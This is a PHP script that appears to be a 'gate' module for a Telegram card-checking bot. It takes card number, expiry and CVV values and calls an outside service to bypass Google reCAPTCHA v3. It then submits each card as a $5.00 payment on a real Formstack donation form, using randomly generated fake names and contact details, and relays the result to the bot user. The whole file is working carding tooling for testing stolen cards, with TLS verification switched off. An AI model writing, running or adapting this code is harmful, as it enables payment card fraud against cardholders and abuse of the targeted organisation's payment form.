<?php 

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

$url = "https://k2bypass.herokuapp.com/RecaptchaV3/";

$curl = curl_init($ch);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Host: k2bypass.herokuapp.com']);
curl_setopt($curl, CURLOPT_POSTFIELDS, '{"anchor":"https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeINU0bAAAAAFIQNz4Bc_d7mbDzeBMENU3LBZN_&co=aHR0cHM6Ly9hbWVyaWNhbmNvdW5jaWxvbmVkLmZvcm1zdGFjay5jb206NDQz&hl=es&v=0aeEuuJmrVqDrEL39Fsg5-UJ&size=invisible&cb=epo81w8oek1e"}');
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
$rev3_bypass = json_decode($resp, true);
$num    = [];
$num[0] = substr($cc[0],0,4);
$num[1] = substr($cc[0],4,4);
$num[2] = substr($cc[0],8,4);
$num[3] = substr($cc[0],12,4);
$cc[0] = implode('', $num);
# ~ REQ 1 ~ #
$headers1 = ['Host: americancounciloned.formstack.com', 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'content-type: multipart/form-data; boundary=----WebKitFormBoundary48BmjdN7BEXF6B05', 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36'];
$post1 = '------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="form"

3696408
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="viewkey"

jgyKOCNrE8
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="password"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="hidden_fields"

field87002120-first,field87002120-last,field87002124-first,field87002124-last,field87002127
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="incomplete"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="incomplete_email"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="incomplete_password"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="referrer"

https://www.acenet.edu/
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="referrer_type"

link
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="_submit"

1
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="style_version"

3
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="latitude"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="longitude"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="viewparam"

793691
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144907"

5.00
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86992969-prefix"

mr
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86992969-first"

'.Name::firstName().'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86992969-initial"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86992969-last"

'.Name::lastName().'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86992969-suffix"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144908-card"

'.$cc[0].'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144908-cardexp"

'.$cc[1].' / '.substr($cc[2],2,4).'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144908-cvv"

'.$cc[3].'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144909-first"

'.Name::firstName().'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144909-initial"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144909-last"

'.Name::lastName().'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144909-suffix"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144910-address"

Main Street 353
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144910-address2"


------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144910-city"

Miami
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144910-state"

FL
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144910-zip"

33001
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144911"

(502) 385-1039
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144912"

'.Internet::freeEmail().'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144913Format"

MDY
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144913M"

May
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144913D"

15
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="field86144913Y"

2022
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="g-recaptcha-response"

'.$rev3_bypass['result'].'
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="fsUserAgent"

Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36
------WebKitFormBoundary48BmjdN7BEXF6B05
Content-Disposition: form-data; name="nonce"

'.randPass(16).'
------WebKitFormBoundary48BmjdN7BEXF6B05--';
$site1 = ['url' => 'https://americancounciloned.formstack.com/forms/index.php', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(2, $site1, $gate, $user);
IsUnspam($req1, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));
Res::SetParams($req1->body, null, null, null, $resp);
$res = Res::idk2();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));

function randPass($length = 10) {
    $str = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
    $int = '1234567890';

    $pass = '';
    for ($i=0; $i < $length; $i++) { 
        $pass .= $str[mt_rand(0, strlen($str)-1)] . $int[mt_rand(0, strlen($int)-1)];
    }
    $pass = substr(str_shuffle($pass), 0, $length);
    return $pass;
}